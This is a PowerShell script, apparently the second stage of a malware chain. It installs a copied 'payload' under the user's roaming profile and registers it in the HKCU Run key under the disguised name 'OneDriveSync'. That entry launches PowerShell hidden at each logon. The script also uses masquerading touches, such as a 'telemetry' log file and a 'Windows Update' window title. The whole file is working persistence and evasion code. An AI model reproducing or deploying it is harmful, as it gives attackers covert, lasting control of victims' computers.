<#
.SYNOPSIS
    Run-key persistence workflow.

.DESCRIPTION
    Installs the launcher under the roaming profile,
    writes the Run-key value, then re-reads the value to confirm
    that the registration is present.

.NOTES
    Targets are limited to the current user's profile.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$RunKeyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
    [string]$RegistryValue = 'OneDriveSync',
    [string]$PersistencePath = "$env:APPDATA\payload.ps1",
    [string]$LogPath = "$env:TEMP\telemetry.json"
)
$ErrorActionPreference = "Stop"

# Diagnostics
function Write-StageLog {
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Payload install
function Install-StagePayload {
    param(
        [string]$SourcePath = "",
        [string]$DestinationPath = ''
    )

    if (-not (Test-Path -Path $SourcePath)) {
        throw "Source payload is missing"
    }
    Copy-Item -Path $SourcePath -Destination $DestinationPath -Force
    return (Test-Path -Path $DestinationPath)
}

# Registry write
function Set-RunKeyPersistence {
    [CmdletBinding()]
    param(
        [string]$KeyPath = '',
        [string]$ValueName = "",
        [string]$TargetPath = ''
    )

    Write-Verbose ("Writing Run value " + $ValueName)
    New-ItemProperty -Path $KeyPath -Name $ValueName -Value ('powershell.exe -NoP -WindowStyle Hidden -File "' + $TargetPath + '"') -PropertyType String -Force
    return (Get-ItemProperty -Path $KeyPath -Name $ValueName)
}

try {
    Write-StageLog -Message "Starting persistence stage"
    $InstallResult = Install-StagePayload -SourcePath "$env:TEMP\updater.exe" -DestinationPath $PersistencePath
    if ($InstallResult) {
        $OperationResult = Set-RunKeyPersistence -KeyPath $RunKeyPath -ValueName $RegistryValue -TargetPath $PersistencePath
        Write-StageLog -Message "Run key written"
    }
    else {
        Write-Warning "Payload copy did not complete"
    }
}
catch {
    Write-Warning "Persistence workflow failed: $($_.Exception.Message)"
}

$PersistenceReport = [ordered]@{
    Stage = "persistence"
    RunKey = $RunKeyPath
    ValueName = $RegistryValue
    Target = $PersistencePath
}
$PersistenceReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Collecting host metadata"
Write-Verbose "Resolving configured target"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Inspecting process list"
Write-Verbose "Reading configuration values"
Write-Verbose "Applying operation timeout"
Write-Verbose "Starting workflow"
Write-Verbose "Exporting operation report"
Write-Verbose "Operation completed"
Set-Location -Path $env:TEMP
$Host.UI.RawUI.WindowTitle = "Windows Update"
